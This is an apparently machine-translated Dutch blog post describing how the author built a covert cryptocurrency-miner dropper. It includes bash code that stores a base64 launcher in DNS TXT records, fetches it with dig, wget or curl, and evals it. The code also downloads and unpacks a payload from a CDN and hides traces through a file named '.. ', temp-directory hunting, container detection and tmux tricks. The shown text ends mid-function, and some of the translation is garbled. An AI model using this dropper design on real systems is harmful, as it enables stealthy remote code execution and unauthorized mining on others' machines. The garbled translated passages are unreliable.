both}@-webkit-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><link href=https://www.unto.re/nl/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Kronieken van een cryptonote-druppelaar</title><script type=application/ld+json>{"url":"/nl/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/nl/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-11-02T20:44:17.310","inLanguage":"nl","name":"","mainEntityOfPage":{"@id":"/nl/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/nl/></a><div class=author__wrap><ul><li class=author__avatar><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/nl/posts/><i class="fas fa-pen menu-icons"></i> berichten</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/nl/media/><i class="fas fa-tv menu-icons"></i> media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/nl/posts/><i class="fas fa-pen menu-icons"></i> berichten</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/nl/media/><i class="fas fa-tv menu-icons"></i> media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div></nav></div></div></div><div><h1 id=title><a href=/nl/posts/chronichles_of_a_cryptonote_dropper> Kronieken van een cryptonote-druppelaar</a></h1><blockquote id=page-description style=font-style:italic>...Hoe ver ben je bereid te gaan voor... penny's?</blockquote></div><div class=franklin-content><p>Neem aan dat je de mijne wilt<a href=https://en.wikipedia.org/wiki/Cryptocurrency> cryptocurrencies</a> op afstandsbediening<em> virtueel</em> hardware. Je moet iets voor mij vinden. Externe servers betekent, nee<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> of GPU-proof of work-algoritmen, eigenlijk alleen<a href=\posts/a-few-notes-on-proof-of-work> CPU-vriendelijke munten</a>.<h2 id=the_software><a class=header-anchor href=#the_software> De software</a></h2><p>Zoek en vind een<a href=https://github.com/xmrig/xmrig> mijnwerker</a> , maar het is niet echt leuk, je wilt iets dat je beter op afstand kunt bedienen, dus je vindt<a href=https://github.com/Bendr0id/xmrigCC> een andere mijnwerker</a> . Wil je ook een<a href=https://github.com/Bendr0id/xmrigcc-proxy> volmacht</a> , omdat veel verbindingen van korte duur zijn, wil je dat niet<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> uw mijnbouwpool. Ook een<a href=https://github.com/search?q=tunnel> tunnel</a> zou leuk zijn.<h2 id=the_design><a class=header-anchor href=#the_design> Het ontwerp</a></h2><p>Sommige botnets gebruiken blockchain-gegevens om opdrachten op te zoeken,<a href=https://twitter.com/sarahjamielewis> iemand</a> schijnt ook te hebben<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> verloren weddenschappen</a> als dit niet meer gebeurt ... hoe dan ook, we zijn niet zo geavanceerd, we zullen rondkomen met een aantal DNS-records die een script opslaan dat de payload ophaalt die zichzelf in een tijdelijke map uitvoert en verlaat<em> bijna</em> geen sporen van zijn opstelling. Hier is een klein stroomschema dat de structuur weergeeft:<h2 id=launcher><a class=header-anchor href=#launcher> Launcher</a></h2><p>Het punt van een opstartscript is dat het toegankelijk moet zijn en gemakkelijk kan worden bijgewerkt, zodat het de tand des tijds kan doorstaan. Updaten<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> records is eenvoudig, en DNS is het laatste dat wordt afgesloten binnen een netwerk... omdat IP-adressen moeilijk te onthouden zijn... dus de kans is groot dat het meestal beschikbaar zal zijn. Je ziet wanneer we zijn<em> het implementatiescript ophalen</em>we gebruiken eigenlijk al wat logica, dit is het opstartscript, het moet de mogelijkheid hebben om DNS-query's uit te voeren om onze records op te zoeken, DNS is misschien alomtegenwoordig, maar<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> graven</a> is niet.<p>Er is hier een klein raadsel, als we een andere tool moeten downloaden<em> om een ​​ander script te downloaden om de payload te downloaden</em> we moeten gewoon de payload downloaden! Ter verdediging ... het doen van deze scriptdans draagt ​​bij aan verduistering, maakt het mogelijk om slechts één implementatie van de launcher te behouden (onderhoudbaarheid, yay), is meestal niet vereist ... dus we onderhouden ook een<a href=https://en.wikipedia.org/wiki/Standalone_program> statisch gekoppeld</a> dig uitvoerbaar bestand om dns-query's uit te voeren, opgehaald door zelfhosting of cloudhosting (ja er zijn fallbacks, zoals 3 of 4, omdat cloudservices een zeer minimale vrije bandbreedte hebben en ook cookies of toegangstokens vereisen ... ze zijn erg script onvriendelijk, doelbewust natuurlijk).<p>Wat staat er in de dns-records? Wij gebruiken<a href=https://en.wikipedia.org/wiki/TXT_record> tekst</a> records, op een aangepast domein (ook hier fallbacks). Waarom TXT? zij zijn toevallig degenen die de grootste hoeveelheid gegevens kunnen opslaan..meestal omdat het een soort van is<a href=https://www.ietf.org/rfc/rfc6763.txt> aanbevolen</a> afhankelijk van<em> dingen</em> . We gebruiken specifiek<a href=https://www.cloudflare.com/> wolkbreuk</a> voor ons DNS-gerommel omdat het gratis is en vrijwel de enige speler in de stad (<em> nou niet echt, maar elk ander alternatief verbleekt qua kenmerken</em> ). Het komt voor dat u meerdere stukken gegevens kunt opslaan op de<em> dezelfde</em> record ... dit begint verwarrend te worden en klauteren voor sommige specificaties ... (tangent) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> gewend om</a> toestaan<em> geketend</em>TXT-records van in totaal ~9k bytes, documenten vermelden nu ~2k bytes, voorafgaand aan de wijziging gebruikte ik ~6k denk ik, en diende het script ongecomprimeerd, daarna moest ik het script uitdunnen en van tevoren comprimeren (eigenlijk heb ik probeerde een te gebruiken<a href=https://freedns.afraid.org/> freedns</a> provider, ik werd binnen een dag verbannen, in de veronderstelling dat ze een strikt niet-vet TXT-recordbeleid hebben), maar gzip-compressie lijkt NIET pijpvriendelijk te zijn en veroorzaakte nog steeds problemen, dus ik moest erin slagen het script zonder compressie te proppen ( eindraaklijn).<p>Hoe slaan we het op? TXT-records ondersteunen alleen alfanumerieke tekenreeksen, nee<a href=https://en.wikipedia.org/wiki/Null_character> NUL's</a> , dus we moeten het verpakken in een niet-null-codering,<a href=https://en.wikipedia.org/wiki/Base64> base64</a> voldoet aan deze beperking, en omdat we opslaan<em> geketend</em> TXT-records, we moeten de uitvoer in stukken verdelen, aangezien we shell-dingen gebruiken, wordt dit gedaan via de<code>-w</code> vlag, op busybox was zo'n vlag vroeger afwezig (of opt-in) op oudere versies wat vervelend was, een alternatief is om de encoder te gebruiken die is gebundeld met openssl,<code>openssl enc -base64</code>.<p>Nu we weten hoe we ons implementatiescript moeten opslaan, slaan we het op met ofwel<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> zie klik</a> of handmatig. Hoe trekken we eraan? We hebben gezegd dat we bindutils of onze eigen nodig hebben<code>dig</code> ...nadat we het dienende eindpunt hebben gekozen, willen we het downloaden, wat meestal beschikbaar is<a href=https://www.gnu.org/software/wget/> wget</a> of<a href=https://curl.se/> Krul</a> , wget wordt veel vaker voorgeïnstalleerd gevonden, maar busybox biedt alleen tls-ondersteuning met dynamische bibliotheken, dus u moet ervoor zorgen dat het eindpunt http bedient of uw hulpprogramma is<code>wget</code> van gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>Het betekent proberen<code>-t2</code> keer wachten<code>-T10</code> seconden zijn<code>-q</code> rustig lezen van<code>-i-</code> standaard (<code>$digurl</code> ) en schrijven naar<code>-O-</code> stout (<code>$filename</code>). Deze opdracht onthult op het eerste gezicht niet wat we downloaden. We gaan om dezelfde reden heel voorzichtig zijn met andere shell-commando's, of we blijven bij shell (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> bash</a> ) ingebouwd waar mogelijk. Let ook goed op waar u uw uitvoerbare bestanden downloadt, u wilt er zeker van zijn dat u ze kunt uitvoeren, aangezien sommige koppelpunten, vooral in containers en<code>tmp</code> paden zijn<code>noexec</code> . Nu we onze dns-querytool hebben, halen we onze records op<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Vlaggen spreken hier voor zich,<code>+short</code> betekent alleen dat we alleen geïnteresseerd zijn in de gegevens zelf, zodat we de uitvoer niet hoeven te ontleden. Het is belangrijk om de DNS-server op te geven, zoals google (<code>8.8.8.8</code> ) of wolkbreuk (<code>1.1.1.1</code> ) omdat veel omgevingen dns-query's standaard omleiden of proxyen naar hun eigen dns-servers. Nadat we het chunked-script hebben opgehaald, werken we met aanhalingstekens en witruimten om het klaar te maken voor decodering<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>Wat als we nu?<em> nog altijd</em> heb je onze launcher niet? DNS is rommelig, we willen een fallback, laten we een subdomein instellen om het opstartscript rechtstreeks op te halen. Voordat we ons script evalueren, willen we het aanpassen, met enkele variabelen, laten we opnieuw een TXT-record gebruiken om een ​​NAME=VALUE-lijst met variabelen op te slaan en deze te ontleden. Er is ook een fallback voor variabelen, cloudflare biedt omleidingen aan op basis van URL's, deze omleidingen worden bediend<em> voordat</em> de bestemming, dus we hebben geen eindpunt nodig, we willen alleen op regex gebaseerde omleidingsregels configureren naar een fictief eindpunt, waar we in geïnteresseerd zijn, zijn de parameters van de url<code>?NAME=VALUE&NAME2=VALUE2...</code>, zodat we onze launcher kunnen parametriseren door simpelweg de omleidings-URL te wijzigen, altijd met aandacht voor citaten en escape-codes<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>de wget<code>-S</code> drukt de omleidings-URL af waarin we geïnteresseerd zijn voor het parseren. Met de parameters en het script evalueren we de variabelen door ze over een bestand te schrijven<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Dit bestand is afkomstig van are deploy script. Het laatste deel van het opstartscript is om te actualiseren<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> trampoline</a> , evalueer het script binnen het huidige shell-proces, of laat het indien mogelijk door tmux worden beheerd.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Het opstartscript wordt gedumpt in een bestand met de naam ".. ". Dit ziet er verwarrend uit omdat het kan worden aangezien als een<em> ouder</em> map. En we nemen het sessiecommando niet op, omdat dat zou blijven hangen in het procescommando, in plaats daarvan starten we de tmux-sessie van tevoren en sturen het broncommando via de tmux-terminalinterface. Gerelateerd hieraan, soms een uitvoerbaar bestand aanroepen met<code>./</code> houdt die tekens in het commando, dus het is beter om de . toe te voegen<code>$PWD</code> naar het pad..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> De lading</a></h2><p>Ons implementatiescript begint met het sourcen van de<code>env.sh</code> bestand, en het behouden of configureren van vars als<code>STARTING_*</code> vars als<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Dit stelt ons in staat om een ​​actieve instantie te doden en opnieuw te starten terwijl de omgeving opnieuw wordt ingesteld. Laten we overschakelen naar een tmp-map met exec-mogelijkheden<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Controleren of binnen een<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> container</a> is ook handig, we kunnen het bestandssysteem doorzoeken op hints<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Nu is het tijd om onze payload te downloaden, we kiezen ervoor om zowel wget als curl te ondersteunen, we weten al hoe we wget moeten gebruiken met zorgvuldige vlaggen, voor curl is het een beetje anders. We moeten een configuratiebestand maken en overschrijven<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>De laatste stap is alleen om de payload te extraheren<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Vermeldenswaard is het gebruik van een [CDN] voor het onderhouden van de payload. Ook hier redt cloudflare ons te hulp van bandbreedte-uitgaven. Door simpelweg onze gecomprimeerde payload te hernoemen met a<em> bestandsextensie</em> ondersteund door cloudflare... het wordt in de cache opgeslagen. Cloudflare controleert niet de headers van wat het onderhoudt, misschien omdat dit op die schaal gewoon onpraktisch is.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Avonturen in Bashland</a></h2><p>Bash werd gekozen in de veronderstelling dat het draagbaar is, er niet al te misplaatst uitziet en alomtegenwoordig is in vergelijking met andere scripttalen zoals perl, ruby ​​of python. De waarheid is dat een op zichzelf staand binair bestand geschreven in golang of lua veel gemakkelijker zou zijn geweest, met minder bugs en gemakkelijker te onderhouden, eigenlijk was bash de slechtst mogelijke keuze, in mijn verdediging, tegen de tijd dat ik zoveel jeuk met bash krabde , het was te laat voor een herschrijving, en het werd ook een beetje saai.<p>Er was ook de optie om busybox te gebruiken met de compile-time-vlag om alle ingebouwde ins (zoals grep en sed) te gebruiken, maar als je op deze manier ingebouwde ins gebruikt, kunnen er geen jobs (fork) spawnen en wordt de daemon blootgesteld aan mogelijke impasses.<p>Ik zal hier enkele bash-functies beschrijven, met de volledige lijst beschikbaar<a href=\assets/posts/bash_functions.txt> hier</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Gebruik de<code>RANDOM</code> variabele om een ​​getal tussen 97-122 te krijgen dat overeenkomt met een tekencode, printf zou ingebouwd moeten zijn, we willen niet binnen een lus splitsen.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Maak gebruik van pijpen om anonieme bestandsdescriptors te maken. Deze gedragen zich niet precies als bestandsdescriptors, maar ze zijn goed genoeg voor<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Slapen zonder forking, door misbruik te maken van de time-outfunctionaliteit van de ingebouwde leesfunctie, gebruikt het een speciale bestandsdescriptor en we moeten ervoor zorgen dat het beschikbaar is om beëindiging te voorkomen.<p>Er zijn functies zoals:<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> worden gebruikt om het systeemgebruik te controleren, deze maken allemaal gebruik van de linux<code>/proc</code> bestanden zonder hulpmiddelen zoals<code>ps</code> , dus geen forking, allemaal pure bash.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Coprocessen zijn beschikbaar sinds bash<code>v4</code> , ze zijn als banen, behalve dat ze een naam en hun eigen bestandsbeschrijvingen hebben.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
